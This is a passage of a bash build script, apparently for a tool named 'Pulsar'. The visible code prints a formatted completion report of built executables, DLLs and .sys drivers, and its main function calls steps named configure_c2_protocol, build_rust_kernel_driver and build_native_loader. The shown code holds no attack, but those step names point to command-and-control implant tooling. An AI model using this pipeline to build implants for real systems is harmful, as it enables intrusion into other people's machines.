        echo -e "${COLOR_MAGENTA}  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${COLOR_RESET}"
        echo ""
    fi
    
    # Output Artifacts
    echo -e "${COLOR_YELLOW}  ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓${COLOR_RESET}"
    echo -e "${COLOR_YELLOW}  ┃  ${COLOR_WHITE}📦  OUTPUT ARTIFACTS$(printf '%*s' 46 '')${COLOR_YELLOW}  ┃${COLOR_RESET}"
    echo -e "${COLOR_YELLOW}  ┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┫${COLOR_RESET}"
    echo -e "${COLOR_YELLOW}  ┃                                                                   ┃${COLOR_RESET}"
    echo -e "${COLOR_YELLOW}  ┃    ${COLOR_GRAY}📁 Location: ${COLOR_WHITE}${DIST_DIR}$(printf '%*s' $((37 - ${#DIST_DIR})) '')${COLOR_YELLOW}  ┃${COLOR_RESET}"
    echo -e "${COLOR_YELLOW}  ┃                                                                   ┃${COLOR_RESET}"
    
    if [[ -d "$DIST_DIR" ]]; then
        local total_size=0
        while IFS= read -r -d '' file; do
            local filename=$(basename "$file")
            local size=$(stat -f%z "$file" 2>/dev/null || stat -c%s "$file" 2>/dev/null)
            local size_kb=$((size / 1024))
            total_size=$((total_size + size))
            
            local icon="📄"
            [[ "$filename" == *.exe ]] && icon="⚡"
            [[ "$filename" == *.dll ]] && icon="📚"
            [[ "$filename" == *.sys ]] && icon="🔧"
            
            printf "${COLOR_YELLOW}  ┃    ${icon} ${COLOR_WHITE}%-40s ${COLOR_CYAN}%6d KB${COLOR_YELLOW}  ┃${COLOR_RESET}\n" "$filename" $size_kb
        done < <(find "$DIST_DIR" -type f \( -name "*.exe" -o -name "*.dll" -o -name "*.sys" \) -print0)
        
        local total_kb=$((total_size / 1024))
        echo -e "${COLOR_YELLOW}  ┃                                                                   ┃${COLOR_RESET}"
        printf "${COLOR_YELLOW}  ┃    ${COLOR_GRAY}Total Size: ${COLOR_CYAN}%-6d KB$(printf '%*s' 38 '')${COLOR_YELLOW}  ┃${COLOR_RESET}\n" $total_kb
    fi
    
    echo -e "${COLOR_YELLOW}  ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛${COLOR_RESET}"
    echo ""
    
    # Final Message
    if [[ $BUILD_ERRORS -eq 0 ]]; then
        echo -e "${COLOR_GREEN}  ═══════════════════════════════════════════════════════════════════${COLOR_RESET}"
        echo -e "    ${COLOR_YELLOW}✨${COLOR_RESET} ${COLOR_GREEN}ALL SYSTEMS GO - READY FOR DEPLOYMENT${COLOR_RESET} ${COLOR_YELLOW}✨${COLOR_RESET}"
        echo -e "${COLOR_GREEN}  ═══════════════════════════════════════════════════════════════════${COLOR_RESET}"
    else
        echo -e "${COLOR_YELLOW}  ═══════════════════════════════════════════════════════════════════${COLOR_RESET}"
        echo -e "    ${COLOR_YELLOW}⚠️  REVIEW WARNINGS BEFORE DEPLOYMENT ⚠️${COLOR_RESET}"
        echo -e "${COLOR_YELLOW}  ═══════════════════════════════════════════════════════════════════${COLOR_RESET}"
    fi
    
    echo ""
    echo -e "  ${COLOR_GRAY}🎯 Press any key to exit...${COLOR_RESET}"
    read -rsn1
}

# =============================================================================
# 🎬 MAIN EXECUTION
# =============================================================================

main() {
    # Trap errors
    trap 'error_handler $? $LINENO' ERR
    
    show_pulsar_banner
    sleep 0.8
    
    initialize_build_system
    clean_build_workspace
    
    configure_c2_protocol
    
    build_dotnet_plugin
    build_rust_kernel_driver
    build_native_loader
    
    show_completion_report
}

error_handler() {
    local exit_code=$1
    local line_number=$2
    
    clear
    echo ""
    echo -e "${COLOR_RED}  ╔═══════════════════════════════════════════════════════════════════╗${COLOR_RESET}"
    echo -e "${COLOR_RED}  ║                                                                   ║${COLOR_RESET}"
    echo -e "${COLOR_RED}  ║                  ${COLOR_WHITE}💥  CRITICAL BUILD ERROR  💥${COLOR_RED}                     ║${COLOR_RESET}"
    echo -e "${COLOR_RED}  ║                                                                   ║${COLOR_RESET}"
    echo -e "${COLOR_RED}  ╚═══════════════════════════════════════════════════════════════════╝${COLOR_RESET}"
    echo ""
    echo -e "  ${COLOR_YELLOW}Error Code:${COLOR_RESET} ${COLOR_RED}$exit_code${COLOR_RESET}"
    echo -e "  ${COLOR_YELLOW}Line Number:${COLOR_RESET} ${COLOR_RED}$line_number${COLOR_RESET}"
    echo ""
    echo -e "  ${COLOR_GRAY}Press any key to exit...${COLOR_RESET}"
    read -rsn1
    exit 1
}

# Run main function
main